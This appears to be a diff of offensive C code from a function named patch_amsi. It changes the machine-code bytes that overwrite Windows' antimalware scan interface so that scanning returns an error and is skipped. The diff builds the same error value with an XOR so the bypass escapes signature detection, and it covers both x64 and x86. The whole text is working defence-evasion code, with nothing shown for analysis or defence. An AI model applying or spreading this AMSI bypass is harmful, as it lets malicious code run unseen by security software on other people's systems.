@@ -12,14 +12,18 @@ int patch_amsi(){
      #if defined(_M_X64)
         printf("[i] Architecture\t\tx86_64\n");
         // https://defuse.ca/online-x86-assembler.htm#disassembly
-        // mov eax, 0x80070057
+        // xor eax, eax
+        // mov eax, 0x11111111
+        // xor eax, 0x91161146
         // ret
-        unsigned char patch_bytes[] = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
+        unsigned char patch_bytes[] = { 0x31, 0xC0, 0xB8, 0x11, 0x11, 0x11, 0x11, 0x35, 0x46, 0x11, 0x16, 0x91, 0xC3 };
     #elif defined(_M_IX86) || defined(__i386__)
         printf("[i] Architecture\tx86\n");
-        // mov eax, 0x80070057
+        // xor eax, eax
+        // mov eax, 0x11111111
+        // xor eax, 0x91161146
         // ret 0x18
-        unsigned char patch_bytes[] = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC2, 0x18, 0x00 };
+        unsigned char patch_bytes[] = { 0x31, 0xC0, 0xB8, 0x11, 0x11, 0x11, 0x11, 0x35, 0x46, 0x11, 0x16, 0x91, 0xC2, 0x18, 0x00 };
     #else
         fprintf(stderr, "[!] Unsupported Architecture!\n");
         return -1;
